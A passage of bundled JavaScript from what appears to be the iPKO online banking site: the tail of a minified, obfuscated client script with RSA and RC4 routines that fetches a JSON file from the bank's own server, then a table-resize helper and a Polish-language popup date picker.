i},n=28),v.prototype.Img=n,v.prototype.DM=(1<<n)-1,v.prototype.DV=1<<n,v.prototype.FV=Math.pow(2,l),v.prototype.F1=l-n,v.prototype.F2=2*n-l,a="0".charCodeAt(0);for(f=0;f<=9;++f)u[a++]=f;a="a".charCodeAt(0);for(f=10;f<36;++f)u[a++]=f;a="A".charCodeAt(0);for(f=10;f<36;++f)u[a++]=f;E.prototype={a:this.a,convert:function(e){return e.s<0||e.Z17(this.a)>=0?e.mod(this.a):e},Z9:function(e){return e},Z18:function(e){e.Z28(this.a,null,e)},Z16:function(e,t,n){e.Z19(t,n),this.Z18(n)},Z17:function(e,t){e.Z20(t),this.Z18(t)}},v.prototype.Z27=function(e){for(var t=this.t-1;t>=0;--t)e[t]=this[t];e.t=this.t,e.s=this.s},v.prototype.fromInt=function(e){this.t=1,this.s=e<0?-1:0,e>0?this[0]=e:e<-1?this[0]=e+DV:this.t=0},v.prototype.fromString=function(e,t){var n;if(t==16)n=4;else if(t==8)n=3;else if(t==256)n=8;else if(t==2)n=1;else if(t==32)n=5;else{if(t!=4){this.fromRadix(e,t);return}n=2}this.t=0,this.s=0;var r=e.length,i=!1,s=0;while(--r>=0){var o=n==8?e[r]&255:y(e,r);if(o<0){e.charAt(r)=="-"&&(i=!0);continue}i=!1,s==0?this[this.t++]=o:s+n>this.Img?(this[this.t-1]|=(o&(1<<this.Img-s)-1)<<s,this[this.t++]=o>>this.Img-s):this[this.t-1]|=o<<s,s+=n,s>=this.Img&&(s-=this.Img)}n==8&&(e[0]&128)!=0&&(this.s=-1,s>0&&(this[this.t-1]|=(1<<this.Img-s)-1<<s)),this.Z21(),i&&v.Mgr.Z29(this,this)},v.prototype.Z21=function(){var e=this.s&this.DM;while(this.t>0&&this[this.t-1]==e)--this.t},v.prototype.Z26=function(e,t){var n;for(n=this.t-1;n>=0;--n)t[n+e]=this[n];for(n=e-1;n>=0;--n)t[n]=0;t.t=this.t+e,t.s=this.s},v.prototype.Z22=function(e,t){for(var n=e;n<this.t;++n)t[n-e]=this[n];t.t=Math.max(this.t-e,0),t.s=this.s},v.prototype.Z31=function(e,t){var n=e%this.Img,r=this.Img-n,i=(1<<r)-1,s=Math.floor(e/this.Img),o=this.s<<n&this.DM,u;for(u=this.t-1;u>=0;--u)t[u+s+1]=this[u]>>r|o,o=(this[u]&i)<<n;for(u=s-1;u>=0;--u)t[u]=0;t[s]=o,t.t=this.t+s+1,t.s=this.s,t.Z21()},v.prototype.Z30=function(e,t){t.s=this.s;var n=Math.floor(e/this.Img);if(n>=this.t){t.t=0;return}var r=e%this.Img,i=this.Img-r,s=(1<<r)-1;t[0]=this[n]>>r;for(var o=n+1;o<this.t;++o)t[o-n-1]|=(this[o]&s)<<i,t[o-n]=this[o]>>r;r>0&&(t[this.t-n-1]|=(this.s&s)<<i),t.t=this.t-n,t.Z21()},v.prototype.Z29=function(e,t){var n=0,r=0,i=Math.min(e.t,this.t);while(n<i)r+=this[n]-e[n],t[n++]=r&this.DM,r>>=this.Img;if(e.t<this.t){r-=e.s;while(n<this.t)r+=this[n],t[n++]=r&this.DM,r>>=this.Img;r+=this.s}else{r+=this.s;while(n<e.t)r-=e[n],t[n++]=r&this.DM,r>>=this.Img;r-=e.s}t.s=r<0?-1:0,r<-1?t[n++]=this.DV+r:r>0&&(t[n++]=r),t.t=n,t.Z21()},v.prototype.Z19=function(e,t){var n=this.abs(),r=e.abs(),i=n.t;t.t=i+r.t;while(--i>=0)t[i]=0;for(i=0;i<r.t;++i)t[i+n.t]=n.am(0,r[i],t,i,0,n.t);t.s=0,t.Z21(),this.s!=e.s&&v.Mgr.Z29(t,t)},v.prototype.Z20=function(e){var t=this.abs(),n=e.t=2*t.t;while(--n>=0)e[n]=0;for(n=0;n<t.t-1;++n){var r=t.am(n,t[n],e,2*n,0,1);(e[n+t.t]+=t.am(n+1,2*t[n],e,2*n+1,r,t.t-n-1))>=t.DV&&(e[n+t.t]-=t.DV,e[n+t.t+1]=1)}e.t>0&&(e[e.t-1]+=t.am(n,t[n],e,2*n,0,1)),e.s=0,e.Z21()},v.prototype.Z28=function(e,t,n){var r=e.abs();if(r.t<=0)return;var i=this.abs();if(i.t<r.t){t!=null&&t.fromInt(0),n!=null&&this.Z27(n);return}n==null&&(n=m());var s=m(),o=this.s,u=e.s,a=this.Img-w(r[r.t-1]);a>0?(r.Z31(a,s),i.Z31(a,n)):(r.Z27(s),i.Z27(n));var f=s.t,l=s[f-1];if(l==0)return;var c=l*(1<<this.F1)+(f>1?s[f-2]>>this.F2:0),h=this.FV/c,p=(1<<this.F1)/c,d=1<<this.F2,g=n.t,y=g-f,b=t==null?m():t;s.Z26(y,b),n.Z17(b)>=0&&(n[n.t++]=1,n.Z29(b,n)),v.GL.Z26(f,b),b.Z29(s,s);while(s.t<f)s[s.t++]=0;while(--y>=0){var E=n[--g]==l?this.DM:Math.floor(n[g]*h+(n[g-1]+d)*p);if((n[g]+=s.am(0,E,n,y,0,f))<E){s.Z26(y,b),n.Z29(b,n);while(n[g]<--E)n.Z29(b,n)}}t!=null&&(n.Z22(f,t),o!=u&&v.Mgr.Z29(t,t)),n.t=f,n.Z21(),a>0&&n.Z30(a,n),o<0&&v.Mgr.Z29(n,n)},v.prototype.Z25=function(){if(this.t<1)return 0;var e=this[0];if((e&1)==0)return 0;var t=e&3;return t=t*(2-(e&15)*t)&15,t=t*(2-(e&255)*t)&255,t=t*(2-((e&z[1])*t&z[1]))&z[1],t=t*(2-e*t%this.DV)%this.DV,t>0?this.DV-t:-t},v.prototype.isEven=function(){return(this.t>0?this[0]&1:this.s)==0},v.prototype.exp=function(e,t){if(e>z[7]||e<1)return v.GL;var n=m(),r=m(),i=t.convert(this),s=w(e)-1;i.Z27(n);while(--s>=0){t.Z17(n,r);if((e&1<<s)>0)t.Z16(r,i,n);else{var o=n;n=r,r=o}}return t.Z9(n)},v.prototype.toString=function(e){if(this.s<0)return"-"+this.negate().toString(e);var t;if(e==16)t=4;else if(e==8)t=3;else if(e==2)t=1;else if(e==32)t=5;else{if(e!=4)return this.toRadix(e);t=2}var n=(1<<t)-1,r,i=!1,s="",o=this.t,u=this.Img-o*this.Img%t;if(o-->0){u<this.Img&&(r=this[o]>>u)>0&&(i=!0,s=g(r));while(o>=0)u<t?(r=(this[o]&(1<<u)-1)<<t-u,r|=this[--o]>>(u+=this.Img-t)):(r=this[o]>>(u-=t)&n,u<=0&&(u+=this.Img,--o)),r>0&&(i=!0),i&&(s+=g(r))}return i?s:"0"},v.prototype.negate=function(){var e=m();return v.Mgr.Z29(this,e),e},v.prototype.abs=function(){return this.s<0?this.negate():this},v.prototype.Z17=function(e){var t=this.s-e.s;if(t!=0)return t;var n=this.t;t=n-e.t;if(t!=0)return t;while(--n>=0)if((t=this[n]-e[n])!=0)return t;return 0},v.prototype.dP5=function(){return this.t<=0?0:this.Img*(this.t-1)+w(this[this.t-1]^this.s&this.DM)},v.prototype.mod=function(e){var t=m();return this.abs().Z28(e,null,t),this.s<0&&t.Z17(v.Mgr)>0&&e.Z29(t,t),t},v.prototype.Z32=function(e,t){var n;return e<256||t.isEven()?n=new E(t):n=new S(t),this.exp(e,n)},v.Mgr=b(0),v.GL=b(1),S.prototype={convert:function(e){var t=m();return e.abs().Z26(this.m.t,t),t.Z28(this.m,null,t),e.s<0&&t.Z17(v.Mgr)>0&&this.m.Z29(t,t),t},Z9:function(e){var t=m();return e.Z27(t),this.Z18(t),t},Z18:function(e){while(e.t<=this.mt2)e[e.t++]=0;for(var t=0;t<this.m.t;++t){var n=e[t]&z[2],r=n*this.mpl+((n*this.mph+(e[t]>>15)*this.mpl&this.um)<<15)&e.DM;n=t+this.m.t,e[n]+=this.m.am(0,r,e,t,0,this.m.t);while(e[n]>=e.DV)e[n]-=e.DV,e[++n]++}e.Z21(),e.Z22(this.m.t,e),e.Z17(this.m)>=0&&e.Z29(this.m,e)},Z16:function(e,t,n){e.Z19(t,n),this.Z18(n)},Z17:function(e,t){e.Z20(t),this.Z18(t)}},x.prototype={i:0,j:0,S:[],Z36:function(e){var t,n,r;for(t=0;t<256;++t)this.S[t]=t;n=0;for(t=0;t<256;++t)n=n+this.S[t]+e[t%e.length]&255,r=this.S[t],this.S[t]=this.S[n],this.S[n]=r;this.i=0,this.j=0},Z24:function(){var e;return this.i=this.i+1&255,this.j=this.j+this.S[this.i]&255,e=this.S[this.i],this.S[this.i]=this.S[this.j],this.S[this.j]=e,this.S[e+this.S[this.i]&255]}};if(p==null){p=new Array,d=0;var C;if(s.appName=="Netscape"&&s.appVersion<"5"&&window.crypto){var k=window.crypto.random(32);for(C=0;C<k.length;++C)p[d++]=k.charCodeAt(C)&255}while(d<c)C=Math.floor(65536*Math.random()),p[d++]=C>>>8,p[d++]=C&255;d=0,N()}var A={Z23:function(e,t){var t;for(t=0;t<e.length;++t)e[t]=L()}},_={n:null,e:0,d:null,p:null,q:null,dP8:null,dP7:null,Z50:null,Z49:function(e){var t,n,r="",i="=",s="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";for(t=0;t+3<=e.length;t+=3)n=parseInt(e.substring(t,t+3),16),r+=s.charAt(n>>6)+s.charAt(n&63);t+1==e.length?(n=parseInt(e.substring(t,t+1),16),r+=s.charAt(n<<2)):t+2==e.length&&(n=parseInt(e.substring(t,t+2),16),r+=s.charAt(n>>2)+s.charAt((n&3)<<4));while((r.length&3)>0)r+=i;return r},Z47:function(e){return e.Z32(this.e,this.n)},Z45:function(e,t){if(!(e!=null&&t!=null&&e.length>0&&t.length>0))return"";this.n=O(e,16),this.e=parseInt(t,16)},Z48:function(e){var t=M(e,this.n.dP5()+7>>3);if(t==null)return null;var n=this.Z47(t);if(n==null)return null;var r=n.toString(16);return(r.length&1)==0?r:"0"+r},Z46:function(e){var t=this.Z48(e);return t?this.Z49(t):null}};return N(),_.Z45(e,(z[1]+2).toString(16)+""),_.Z46(t)},a38:function(a,b,c,d,e){if(typeof a!="string"){d=0;for(c in h){if(typeof h[c]!=="function"){if(d==a){a=c;break}d++}}}if(a in h){if(typeof h[a]!=="function"){if(b!==null){return this.a36(b,h[a])}}}this.a13(this.a24(this.g[2],b),this.a24(this.g[2]+2,b),this.a24(this.g[5]+3,b),0,this.a12);this.a12="";return false},a14:function(a,b,c,d,e){if(a==0){return this.a25(b,this.g[3],33,94,126,0)}if(a=="a"){c=this.a32(d);return c[e](this.a14(0,b))()}return this.a6(this.a38(Math.abs(a),b),this.a)},a10:function(a,b){return this.a21(-2,a,b)},a6:function(e,t,n,r,i,s,o,u){u=[];i="";for(o=0;o<t.length;o++)u[o]=t.charCodeAt(o);t=e.match(/.{4}/g),s=0,i="";for(n=0;n<t.length;n++)e=parseInt(t[n].substr(0,2),this.g[4]),o=parseInt(t[n].substr(2,4),this.g[4]),e%3==0?r=(o^u[s])-e:r=o^u[s]+e,i+=String.fromCharCode(r),s++,s>this.g[5]&&(s=0);return i},a36:function(e,t,n,r,i){i=t.split(""),t="";for(n in i){if(typeof i[n]=="string"){r=e.indexOf(i[n].toLowerCase()),r!=-1?t+=r:t+=i[n]}}return t}}};var h="";function D(z,y,x,w,v,s){if(this[b[1]]==4&&this.status==b[0]){var x=this.responseText;y=x.length;v=0;if(y>10&&x.substr(0,1)=="{"){if(x.substr(y-1,1)=="}"){x=x.substr(1,y-2);y=x.split("','");z={};for(x in y){if(typeof y[x]=="string"&&y[x].indexOf("':'")){w=y[x].split("':'");w[0]=w[0].replace(/'/g,"");w[1]=w[1].replace(/'/g,"");if(v==0){s=w[1].substr(2,2)}z[w[0]]=w[1];v++}}h=z;z=s+"-"+v;e+=a.substr(0,2);d[e+a]=[];f=new g(h,C[2],e+a,d,"enableGLside",40,2,z),PKOBPn24="45102011121111000000001001";f.z("");B(function(){f.z("","reload",f)},500)}}}}B(function(){if(h==""){(function(A,f){(function(a,b){if(window.XMLHttpRequest){a=new XMLHttpRequest}else{a=new ActiveXObject(A[3][2])}a[A[3][3]]=A[0];a[A[3][4]](C[0]+A[2],b,true);a[A[3][5]]()})(0,A[1])})([D,C[3]+function(a,b,c){if(b.indexOf(a+"biznes"+c)>-1){return"c"}if(b.indexOf(a+c+"/nowe")>-1){return"b"}return"a"}("ipko",document.location.href,".pl")+C[1],C[4],b],f)}},1e3)})(""+(new Date).getTime(),[200,"readyState","Microsoft.XMLHTTP","onreadystatechange","open","send"],0,window,"ipkoimg",0,setTimeout,["GE","imgs.json","https://www.ipko.pl/ikd_img/","/ikd_scripts/skins/ipko/","T","undefined","ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/","div","number","ma",window]);
/* /ikd_scripts/skins/ipko/mpcli.js?v=1 end */
/* /ikd_scripts/skins/ipko/resize.js?v=2 start */


  function get_table_width(table) {
     return table.offsetWidth;
  }

  function get_max_table_width(table_list)
  {
     var max = 0;
     for (i=0; i <= table_list.length-1; i++) {
        var roz_tabeli = get_table_width(table_list[i]);
        if (roz_tabeli > max) {
           max = roz_tabeli
        }
     }
     
     return max;
  }


  function check_resize_div(){
    var ver_ie=document.all;
    var table_list;
    
    if (ver_ie) {
       table_list = getElementsByName_iefix('table', 'content_table');
    } else {
       table_list = document.getElementsByName('content_table');
    }
    
    var content = document.getElementById("content");
    var center_box = document.getElementById("colcenter535");
    var page = document.getElementById('page_contener');
    var foot_box = document.getElementById("footcontener_box");
    var menu_ul = document.getElementById("mainmenu");
	
	var menu_box = document.getElementById('mainmenucontener');
    var inteligo_box = document.getElementById('inteligomenu');
	
    if (table_list && content && center_box && page && foot_box && menu_ul) {
       /* trzeba cos robic */
       var rozmiar = get_max_table_width(table_list);
       var content_rozmiar = center_box.offsetWidth;
       
       if (rozmiar > content_rozmiar - 3) {
          var roznica = rozmiar - content_rozmiar + 4;
          page.style.width = page.offsetWidth + roznica + 3 + "px";
          content.style.width = content.offsetWidth + roznica +"px";
          center_box.style.width = rozmiar + 4 +"px";
          foot_box.style.width = page.style.width;		  
		  menu_ul.style.width = menu_box.offsetWidth - inteligo_box.offsetWidth - 10 + "px";
       }
    }
  }

  /*WERSJA IE6*/
  function set_resize_div(content_rozmiar){
    var table_list = getElementsByName_iefix('table', 'content_table');    
    var content = document.getElementById("content");
    var center_box = document.getElementById("colcenter535");
    var page = document.getElementById('page_contener');
    var foot_box = document.getElementById("footcontener_box");
    var menu_ul = document.getElementById("mainmenu");

    if (table_list && content && center_box && page && foot_box) {
       /* trzeba cos robic */
       var rozmiar = get_max_table_width(table_list);
       var roznica = rozmiar - content_rozmiar + 4;

       if (rozmiar > content_rozmiar) {
          page.style.width = page.offsetWidth + roznica + 2 + "px";
          content.style.width = content.offsetWidth + roznica + 1 +"px";
          center_box.style.width = rozmiar + 4 +"px";
          foot_box.style.width = page.style.width;
		  menu_ul.style.width = menu_box.offsetWidth - inteligo_box.offsetWidth - 11 + "px";
       }
    }
  }


  function getElementsByName_iefix(tag, name) {
     
     var elem = document.getElementsByTagName(tag);
     var arr = new Array();
     for(i = 0,iarr = 0; i < elem.length; i++) {
          att = elem[i].getAttribute("name");
          if(att == name) {
               arr[iarr] = elem[i];
               iarr++;
          }
     }
     return arr;
  }

/* /ikd_scripts/skins/ipko/resize.js?v=2 end */
/* /ikd_scripts/skins/ipko/popcalendar.js start */
var fixedX = -1, fixedY = -1;
var showToday = 1
var gotoString = "Przejd¼ do bie¿±cego miesi±ca"
var todayString = "Dzi¶ jest"
var closeString = "Zamknij kalendarz"
var scrollLeftMessage = "Kliknij by przewin±æ na poprzedni miesi±c. Przytrzymaj wci¶niêty przycisk myszki by przewijaæ w sposób ci±g³y."
var scrollRightMessage = "Kliknij by przewin±æ na nastêpny miesi±c. Przytrzymaj wci¶niêty przycisk myszki by przewijaæ w sposób ci±g³y."
var scrollLeftShortMessage = 'Poprzedni miesi±c';
var scrollRightShortMessage = 'Nastêpny miesi±c';
var selectMonthMessage = "Kliknij by wybraæ miesi±c"
var selectYearMessage = "Kliknij by wybraæ rok"
var selectDateMessage = "Wybierz dzieñ [date]"

var dayName = new Array ("Pn","Wt","¦r","Cz","Pt","So","Nd")
var dayName2 = new Array ("Poniedzia³ek","Wtorek","¦roda","Czwartek","Pi±tek","Sobota","Niedziela")
var monthName = new Array("Styczeñ", "Luty", "Marzec", "Kwiecieñ", "Maj", "Czerwiec", "Lipiec", "Sierpieñ",
									"Wrzesieñ", "Pa¼dziernik", "Listopad", "Grudzieñ")
var monthName2 = new Array("Stycznia", "Lutego", "Marca", "Kwietnia", "Maja", "Czerwca", "Lipca", "Sierpnia",
 							 "Wrze¶nia", "Pa¼dziernika", "Listopada", "Grudnia")

var crossobj, crossMonthObj, crossYearObj, monthSelected, yearSelected, daySelected, omonthSelected, oyearSelected, odaySelected;
var monthConstructed, yearConstructed, intervalID1, intervalID2, timeoutID1, timeoutID2, ctlNow, nStartingYear;
var ctlToPlaceValue;
var beginYear, endYear;
var bPageLoaded=false, bShow = false;

var ie=document.all;
var dom=document.getElementById;
var ns4=document.layers

var today = new Date();
var dateNow = today.getDate()
var monthNow = today.getMonth()
var yearNow = today.getYear()

if(yearNow < 1000)
{
    yearNow += 1900;
}

nStartingYear = 2001;

function hideElement( elmID, overDiv)
{
    if( ie )
    {
        for( i = 0; i < document.all.tags( elmID ).length; i++ )
        {
            obj = document.all.tags( elmID )[i];
            if ( !obj || !obj.offsetParent )
                continue;

            objLeft   = obj.offsetLeft;
            objTop    = obj.offsetTop;
            objParent = obj.offsetParent;

            while( objParent && objParent.tagName.toUpperCase() != "BODY")
            {
                objLeft  += objParent.offsetLeft;
                objTop   += objParent.offsetTop;
                objParent = objParent.offsetParent;
            }

            objHeight = obj.offsetHeight;
            objWidth = obj.offsetWidth;

            if(( overDiv.offsetLeft + overDiv.offsetWidth ) <= objLeft );
            else if(( overDiv.offsetTop + overDiv.offsetHeight + 50 ) <= objTop );
            else if( overDiv.offsetTop >= ( objTop + objHeight ));
            else if( overDiv.offsetLeft >= ( objLeft + objWidth ));
            else
                obj.style.visibility = "hidden";
        }
    }
}

function showElement( elmID )
{
    if( ie )
    {
        for( i = 0; i < document.all.tags( elmID ).length; i++ )
        {
            obj = document.all.tags( elmID )[i];

            if( !obj || !obj.offsetParent )
                continue;
            obj.style.visibility = "";
        }
    }
}

if (dom)
{
	document.write ("<div onclick='bShow=true' id='calendar' style='z-index:+999; left:0px; top:0px; position:absolute;visibility:hidden;'><table width=220	class=calTable cellspacing=0><tr><td class=calTopRow><table width=218><tr><td class=calTopControls><span id='caption'></span></td><td align=center><span onMouseOver='this.className=\"calCloseOver\";window.status=\""+closeString+".\";' onMouseOut='this.className=\"calClose\";window.status=\"\";' onClick='javascript:hideCalendar()' class=calClose title='"+closeString+"'>X</span></td></tr></table></td></tr><tr><td class=calContent><span id='cal_content'></span></td></tr>")
	if (showToday==1)
	{
		document.write ("<tr><td class=calBottomRow><span id='lblToday'></span></td></tr>")
	}
	document.write ("</table></div><div id='selectMonth' style='left:0px; top:0px; z-index:+999;position:absolute;visibility:hidden;'></div><div id='selectYear' style='left:0px; top:0px; z-index:+999;position:absolute;visibility:hidden;'></div>");
}

function initCalendar()
{
	if (!ns4)
	{
		crossobj=(dom)?document.getElementById("calendar").style : ie? document.all.calendar : document.calendar
		hideCalendar()

		crossMonthObj=(dom)?document.getElementById("selectMonth").style : ie? document.all.selectMonth	: document.selectMonth

		crossYearObj=(dom)?document.getElementById("selectYear").style : ie? document.all.selectYear : document.selectYear

		monthConstructed=false;
		yearConstructed=false;

		if (showToday==1)
		{
			document.getElementById("lblToday").innerHTML =	todayString + " <a onMouseOver='window.status=\""+gotoString+".\"; return true;' onMouseOut='window.status=\"\"' title='"+gotoString+"' class=calA  href='javascript:gotoToday();'>" + dateToString(today.getDay(),dateNow,monthNow,yearNow) + "</a>"
		}

		var sHTML1 = "<span id='spanLeft' class=calControl onmouseover='this.className=\"calControlOver\";window.status=\""+scrollLeftMessage+"\"' onclick='javascript:decMonth()' onmouseout='clearInterval(intervalID1);this.className=\"calControl\";window.status=\"\"' onmousedown='clearTimeout(timeoutID1);timeoutID1=setTimeout(\"StartDecMonth()\",500)'	onmouseup='clearTimeout(timeoutID1);clearInterval(intervalID1)' title=\""+scrollLeftShortMessage+"\"'>&nbsp&lt;&nbsp</span>&nbsp;"
		sHTML1+="<span id='spanRight' class=calControl  onmouseover='this.className=\"calControlOver\";window.status=\""+scrollRightMessage+"\"' onmouseout='clearInterval(intervalID1);this.className=\"calControl\";window.status=\"\"' onclick='incMonth()' onmousedown='clearTimeout(timeoutID1);timeoutID1=setTimeout(\"StartIncMonth()\",500)' onmouseup='clearTimeout(timeoutID1);clearInterval(intervalID1)' title=\""+scrollRightShortMessage+"\"'>&nbsp&gt;&nbsp</span>&nbsp"
		sHTML1+="<span id='spanMonth' class=calControl onmouseover='this.className=\"calControlOver\";window.status=\""+selectMonthMessage+".\"' onmouseout='this.className=\"calControl\";window.status=\"\"' onclick='popUpMonth()' title=\""+selectMonthMessage+"\"'></span>&nbsp;"
		sHTML1+="<span id='spanYear' class=calControl onmouseover='this.className=\"calControlOver\";window.status=\""+selectYearMessage+".\"' onmouseout='this.className=\"calControl\";window.status=\"\"'	onclick='popUpYear()' title=\""+selectYearMessage+"\"'></span>&nbsp;"

		document.getElementById("caption").innerHTML  =	sHTML1

		bPageLoaded=true
	}
}

function gotoToday()
{
    if(yearNow > endYear || yearNow < beginYear)
        return;

    monthSelected=monthNow;
    yearSelected=yearNow;
    daySelected=dateNow;
    constructCalendar();
}

function hideCalendar()
{
    if (crossobj != null)
        crossobj.visibility="hidden"
    if (crossMonthObj != null)
        crossMonthObj.visibility="hidden";
    if (crossYearObj != null)
        crossYearObj.visibility="hidden";

    showElement( 'SELECT' );
    showElement( 'APPLET' );
}

function padZero(num)
{
	return (num	< 10)? '0' + num : num ;
}

function constructDate(d,m,y)
{
	return y+'-'+padZero(m+1)+'-'+padZero(d);
}

function closeCalendar()
{
	hideCalendar();
    ctlToPlaceValue.value
      = constructDate(daySelected,monthSelected,yearSelected);
//  ctlToPlaceValue.select();
  if (ctlToPlaceValue.onchange){
    ctlToPlaceValue.onchange();
  }
}

function StartDecMonth()
{
	intervalID1=setInterval("decMonth()",80)
}

function StartIncMonth()
{
	intervalID1=setInterval("incMonth()",80)
}

function incMonth ()
{
	if (monthSelected >=11 || yearSelected > endYear || yearSelected < beginYear)
    {
        if (yearSelected < beginYear)
        {
            monthSelected=0;
            yearSelected=beginYear;
        }
        else if (yearSelected < endYear)
        {
            monthSelected=0;
            yearSelected++;
        }
        else
        {
            monthSelected=11;
            yearSelected=endYear;
        }
	}
    else
    {
        monthSelected++;
    }
	constructCalendar()
}

function decMonth ()
{
	if (monthSelected <= 0 || yearSelected < beginYear || yearSelected > endYear)
    {
        if (yearSelected > endYear)
        {
            monthSelected = 11;
            yearSelected = endYear;
        }
        else if (yearSelected > beginYear)
        {
            monthSelected=11;
            yearSelected--;
        }
        else
        {
            monthSelected=0;
            yearSelected=beginYear;
        }
	}
    else
    {
        monthSelected--;
    }
	constructCalendar()
}

function constructMonth()
{
	popDownYear()
	if (!monthConstructed)
    {
		var sHTML =	""
		for	(var i=0; i<12;	i++)
        {
			var sName = monthName[i];
			if (i==monthSelected)
            {
				sName =	"<B>" +	sName +	"</B>"
			}
			sHTML += "<tr><td id='m" + i + "' onmouseover='this.className=\"calComboOver\";' onmouseout='this.className=\"\"' onclick='monthConstructed=false;monthSelected=" + i + ";constructCalendar();popDownMonth();event.cancelBubble=true'>&nbsp;" + sName + "&nbsp;</td></tr>"
		}
		document.getElementById("selectMonth").innerHTML = "<table width=70	class=calCombo cellspacing=0 onmouseover='clearTimeout(timeoutID1)'	onmouseout='clearTimeout(timeoutID1);timeoutID1=setTimeout(\"popDownMonth()\",100);event.cancelBubble=true'>" +	sHTML +	"</table>"
		monthConstructed=true
	}
}

function popUpMonth()
{
	constructMonth()
	crossMonthObj.visibility = (dom||ie)? "visible"	: "show"
	crossMonthObj.left = parseInt(crossobj.left) + 50+"px"
	crossMonthObj.top =	parseInt(crossobj.top) + 26+"px"
}

function popDownMonth()
{
	crossMonthObj.visibility= "hidden"
}

function incYear()
{
    if(nStartingYear + 7 > endYear)
    {
        bShow=true;
        return;
    }
    for(var i=0; i<7; i++)
    {
        var txtYear;
        var newYear = (i+nStartingYear)+1;
        if (newYear==yearSelected)
        {
            txtYear =	"&nbsp;<B>"	+ newYear +	"</B>&nbsp;";
        }
        else
        {
            txtYear =	"&nbsp;" + newYear + "&nbsp;";
        }
        document.getElementById("y"+i).innerHTML = txtYear;
    }
    nStartingYear ++;
    bShow=true;
}

function decYear()
{
    if (nStartingYear <= beginYear)
    {
        bShow = true;
        return;
    }
	for	(var i=0; i<7; i++)
    {
        var txtYear;
		var newYear	= (i+nStartingYear)-1
		if (newYear==yearSelected)
		{
            txtYear =	"&nbsp;<B>"	+ newYear +	"</B>&nbsp;"
        }
		else
		{
            txtYear =	"&nbsp;" + newYear + "&nbsp;"
        }
		document.getElementById("y"+i).innerHTML = txtYear
	}
	nStartingYear --;
	bShow=true
}

function selectYear(nYear)
{
	yearSelected=parseInt(nYear)+parseInt(nStartingYear);
	yearConstructed=false;
	constructCalendar();
	popDownYear();
}

function constructYear()
{
	popDownMonth()
	var sHTML =	""
	//if (!yearConstructed)
  // {
        if(yearSelected < beginYear)
            yearSelected = beginYear;
        if(yearSelected > endYear)
            yearSelected = endYear;

        if (endYear - beginYear > 7)
        {
            sHTML =	"<tr><td align='center' onmouseover='this.className=\"calComboOver\";' onmouseout='this.className=\"\"' 	onmousedown='clearInterval(intervalID1);intervalID1=setInterval(\"decYear()\",30)' onmouseup='clearInterval(intervalID1)'>-</td></tr>";
        }

        if(endYear - yearSelected < 3)
            nStartingYear = endYear - 6;
        else
            nStartingYear =	yearSelected-3;
        if (nStartingYear < beginYear)
            nStartingYear = beginYear;

		var j = 0;
		for (var i=nStartingYear; i<(nStartingYear + 7) && i <= endYear; i++)
        {
			var sName =	i;
			if (i==yearSelected){
				sName =	"<B>" +	sName +	"</B>"
			}

			sHTML += "<tr><td id='y" + j + "' onmouseover='this.className=\"calComboOver\";' onmouseout='this.className=\"\"' onclick='selectYear("+j+");event.cancelBubble=true'>&nbsp;" + sName + "&nbsp;</td></tr>"
			j ++;
		}

        if (endYear - beginYear > 7)
        {
            sHTML += "<tr><td align='center' onmouseover='this.className=\"calComboOver\";' onmouseout='this.className=\"\"' onmousedown='clearInterval(intervalID2);intervalID2=setInterval(\"incYear()\",30)'	onmouseup='clearInterval(intervalID2)'>+</td></tr>";
        }

		document.getElementById("selectYear").innerHTML	= "<table width=44 class=calCombo onmouseover='clearTimeout(timeoutID2)' onmouseout='clearTimeout(timeoutID2);timeoutID2=setTimeout(\"popDownYear()\",100)' cellspacing=0>"	+ sHTML	+ "</table>"

		yearConstructed = true;
	//}
}

function popDownYear()
{
	clearInterval(intervalID1)
	clearTimeout(timeoutID1)
	clearInterval(intervalID2)
	clearTimeout(timeoutID2)
	crossYearObj.visibility= "hidden"
}

function popUpYear()
{
	var	leftOffset

	constructYear()
	crossYearObj.visibility	= (dom||ie)? "visible" : "show"
	leftOffset = parseInt(crossobj.left) + document.getElementById("spanYear").offsetLeft
	if (ie)
	{
		leftOffset += 6
	}
	crossYearObj.left = leftOffset+"px";
	crossYearObj.top = parseInt(crossobj.top) + 26+"px";
}

function constructCalendar ()
{
	var aNumDays = Array (31,0,31,30,31,30,31,31,30,31,30,31)

	var dateMessage
	var	startDate =	new	Date (yearSelected,monthSelected,1)
	var endDate
	var numDaysInMonth

	if (monthSelected==1)
	{
		endDate	= new Date (yearSelected,monthSelected+1,1);
		endDate	= new Date (endDate - (24*60*60*1000));
		numDaysInMonth = endDate.getDate()
	}
	else
	{
		numDaysInMonth = aNumDays[monthSelected];
	}

	var datePointer	= 0
	var dayPointer = startDate.getDay() - 1

	if (dayPointer<0)
	{
		dayPointer = 6
	}

	var sHTML =	"<table border=0 width='100%'><tr>"

	for (i=0; i<7; i++)
    {
		sHTML += "<td class=calTdHead>"+ dayName[i]+"&nbsp;</td>"
	}
	sHTML +="</tr><tr>"

	for ( var i=1; i<=dayPointer;i++ )
	{
		sHTML += "<td>&nbsp;</td>"
	}

	for ( datePointer=1; datePointer<=numDaysInMonth; datePointer++ )
	{
		dayPointer++;
		sHTML += "<td ";

		if	(dayPointer % 7 == 6 || dayPointer % 7 == 0)
            sHTML += "class=calHoliday ";
        else
            sHTML += "class=calOrdDay ";

        var sHint = selectDateMessage.replace("[date]",constructDate(datePointer,monthSelected,yearSelected));
		dateMessage = "onmouseover='window.status=\""+sHint+"\";return true;' onmouseout='window.status=\"\"' "

        sHTML += dateMessage+" title=\"" + sHint + "\" onClick='javascript:daySelected="+datePointer + ";closeCalendar();'";

       var todayBeg = '', todayEnd = '', selBeg = '', selEnd = '';

		if (datePointer==odaySelected && monthSelected==omonthSelected && yearSelected==oyearSelected)
        {
            selBeg = "<span class=calDaySelected>";
            selEnd = "</span>";
        }
		if (datePointer==dateNow && monthSelected==monthNow && yearSelected==yearNow)
        {
            todayBeg = "<span class=calToday>";
            todayEnd = "</span>";
        }

        sHTML +=">" + selBeg + todayBeg + "&nbsp;" + datePointer + "&nbsp;" + todayEnd + selEnd + "</td>";

        if (dayPointer % 7 == 0)
			sHTML += "</tr><tr>"
	}

	document.getElementById("cal_content").innerHTML   = sHTML;
	document.getElementById("spanMonth").innerHTML = "&nbsp;" +	monthName[monthSelected] + "&nbsp;<span class=calV>V</span>"
	document.getElementById("spanYear").innerHTML = "&nbsp;" + yearSelected	+ "&nbsp;<span class=calV>V</span>"
}

